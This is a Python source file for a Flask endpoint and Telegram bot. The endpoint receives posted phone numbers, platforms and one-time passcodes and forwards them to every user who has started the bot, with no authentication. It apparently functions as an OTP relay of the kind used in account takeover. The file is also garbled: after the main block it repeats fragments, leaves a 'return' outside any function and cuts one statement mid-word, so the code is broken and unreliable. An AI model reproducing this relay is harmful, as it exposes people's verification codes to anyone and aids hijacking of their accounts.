# -*- coding: utf-8 -*-
import threading
import json
import os
import asyncio
from flask import Flask, request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ===== CONFIG =====
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))

DATA_FILE = "data.json"

# ===== LOAD DATA =====
def load_data():
    if not os.path.exists(DATA_FILE):
        return {"users": []}
    with open(DATA_FILE, "r") as f:
        return json.load(f)

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f)

data = load_data()

# ===== FLASK =====
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot Running ✅"

@app.route('/otp', methods=['POST'])
def otp():
    req = request.json or {}

    msg = f"""🌍 {req.get('country','N/A')}
📱 {req.get('number','N/A')}
💻 {req.get('platform','N/A')}
🔐 OTP: {req.get('otp','N/A')}"""

    async def send():
        for user in data["users"]:
            try:
                await bot.send_message(chat_id=user, text=msg)
            except:
                pass

    asyncio.run(send())
    return {"ok": True}

# ===== TELEGRAM =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id

    if uid not in data["users"]:
        data["users"].append(uid)
        save_data(data)

    keyboard = [
        [InlineKeyboardButton("👑 Admin Panel", callback_data="admin")]
    ]

    await update.message.reply_text(
        "🤖 Bot Active ✅",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.from_user.id != ADMIN_ID:
        await query.message.reply_text("❌ Not Admin")
        return

    await query.message.edit_text("👑 Admin Panel Working ✅")

# ===== RUN BOT =====
def run_bot():
    global bot

    app_tg = Application.builder().token(BOT_TOKEN).build()
    bot = app_tg.bot

    app_tg.add_handler(CommandHandler("start", start))
    app_tg.add_handler(CallbackQueryHandler(buttons))

    print("🤖 Bot Started...")
    app_tg.run_polling()

# ===== MAIN =====
if __name__ == "__main__":
    threading.Thread(target=run_bot).start()

    print("🌐 Flask Started...")
    app.run(host="0.0.0.0", port=8000)
    import asyncio
    async def send():
        for u in data["users"]:
            await bot.send_message(chat_id=u, text=msg)

    asyncio.run(send())
    return {"ok": True}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id

    if uid not in data["users"]:
        data["users"].append(uid)
        save_data(data)

    kb = [[InlineKeyboardButton("👑 Admin", callback_data="admin")]]

    await update.message.reply_text(
        "Bot Active ✅",
        reply_markup=InlineKeyboardMarkup(kb)
    )

async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback    async def send():
        for u in data["users"]:
            await bot.send_message(chat_id=u, text=msg)

    asyncio.run(send())
    return {"ok": True}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in data["users"]:
        data["users"].append(uid)
        save_data(data)

    kb = [[InlineKeyboardButton("👑 Admin", callback_data="admin")]]
    await update.message.reply_text("Bot Active ✅", reply_markup=InlineKeyboardMarkup(kb))

async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()

    if q.from_user.id != ADMIN_ID:
        return

    await q.message.edit_text("Admin Panel 🔥")

def run_bot():
    global bot
    app_tg = Application.builder().token(BOT_TOKEN).build()
    bot = app_tg.bot

    app_tg.add_handler(CommandHandler("start", start))
    app_tg.add_handler(CallbackQueryHandler(buttons))

    app_tg.run_polling()

if __name__ == "__main__":
    threading.Thread(target=run_bot).start()
    app.run(host="0.0.0.0", port=8000)
